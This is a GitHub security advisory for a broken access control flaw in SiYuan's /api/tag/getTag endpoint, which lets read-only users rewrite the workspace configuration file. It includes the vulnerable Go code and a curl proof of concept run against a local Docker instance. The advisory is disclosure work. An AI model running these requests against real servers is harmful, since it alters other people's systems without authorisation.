# [M] SiYuan: Broken access control in `/api/tag/getTag` — Reader role can mutate `Conf.Tag.Sort` and persist to disk

## Summary
Severity: Medium
Advisory: GHSA-6r88-8v7q-q4p2
CVE: CVE-2026-45147
CWE: CWE-285, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-6r88-8v7q-q4p2
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0 <0.0.0-20260512140701-d7b77d945e0d

## Details
### Summary

`POST /api/tag/getTag` is registered with `model.CheckAuth` only, omitting both `model.CheckAdminRole` and `model.CheckReadonly`, despite the handler performing a configuration write that is normally guarded by both. Any authenticated user — including publish-service `RoleReader` accounts and `RoleEditor` accounts on a read-only workspace — can call this endpoint with a `sort` argument to mutate `model.Conf.Tag.Sort` and trigger `model.Conf.Save()`, which atomically rewrites the entire workspace `conf.json`.

Same root-cause class as the patched `GHSA-4j3x-hhg2-fm2x` (which fixed missing `CheckAdminRole + CheckReadonly` on `/api/template/renderSprig`).

### Details

**Affected files / lines (v3.6.5):**

`kernel/api/router.go:170` — only `CheckAuth`:

```go
ginServer.Handle("POST", "/api/tag/getTag", model.CheckAuth, getTag)
// Compare the sibling registrations on the next two lines, which DO gate writes:
ginServer.Handle("POST", "/api/tag/renameTag", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, renameTag)
ginServer.Handle("POST", "/api/tag/removeTag", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, removeTag)
```

`kernel/api/tag.go:28-64` — handler. The `if nil != arg["sort"]` block writes config without any role check:

```go
func getTag(c *gin.Context) {
    ret := gulu.Ret.NewResult()
    defer c.JSON(http.StatusOK, ret)
    arg, ok := util.JsonArg(c, ret)
    if !ok { return }
    ...
    if nil != arg["sort"] {                    // ← unauthorized write path
        sortVal, ok := util.ParseJsonArg[float64]("sort", arg, ret, true, false)
        if !ok { return }
        model.Conf.Tag.Sort = int(sortVal)
        model.Conf.Save()                      // persists entire conf to <workspace>/conf/conf.json
    }
    ...
}
```

`Conf.Save()` rewrites the **entire** configuration file, which means a malicious caller racing with a legitimate config change can roll back another user's setting (TOCTOU on the global config object).

### PoC

Same Docker setup as Advisory 1.

```bash
# 1. Authenticate (any role with CheckAuth pass — admin used here for convenience).
curl -s -c /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/loginAuth \
  -H 'Content-Type: application/json' -d '{"authCode":"audittest"}' >/dev/null

# 2. Read current Conf.Tag.Sort.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \
  -H 'Content-Type: application/json' -d '{}' \
  | python3 -c "import json,sys;print('Conf.Tag.Sort BEFORE =',json.load(sys.stdin)['data']['conf']['tag']['sort'])"
# → Conf.Tag.Sort BEFORE = 4

# 3. Mutate via the read-style endpoint.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/tag/getTag \
  -H 'Content-Type: application/json' -d '{"sort": 7}'
# → {"code":0,"msg":"","data":[]}

# 4. Confirm in-memory.
curl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \
  -H 'Content-Type: application/json' -d '{}' \
  | python3 -c "import json,sys;print('Conf.Tag.Sort AFTER =',json.load(sys.stdin)['data']['conf']['tag']['sort'])"
# → Conf.Tag.Sort AFTER = 7

# 5. Confirm persisted to disk inside the container.
docker exec siyuan-audit grep -o 'sort":[0-9]*' /siyuan/workspace/conf/conf.json
# → sort":7
```

The vulnerability is exposed to publish-mode `RoleReader` (default for any anonymous publish visitor) and to `RoleEditor` users on workspaces where the administrator has set `Editor.ReadOnly = true`.

### Impact

Limited direct damage — the writable field is only the tag display sort order. The pattern is concerning because:

- It demonstrates the same gap that `GHSA-4j3x-hhg2-fm2x` was meant to flag broadly (missing `CheckAdminRole + CheckReadonly` on a read-style endpoint that performs writes); each occurrence has to be patched individually.
- `Conf.Save()` rewrites the whole file, so a write-race during a legitimate configuration change can overwrite unrelated user-set values.
- A publish-service Reader being able to mutate any server state at all violates the intended trust boundary.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6r88-8v7q-q4p2
- https://nvd.nist.gov/vuln/detail/CVE-2026-45147
- https://github.com/siyuan-note/siyuan
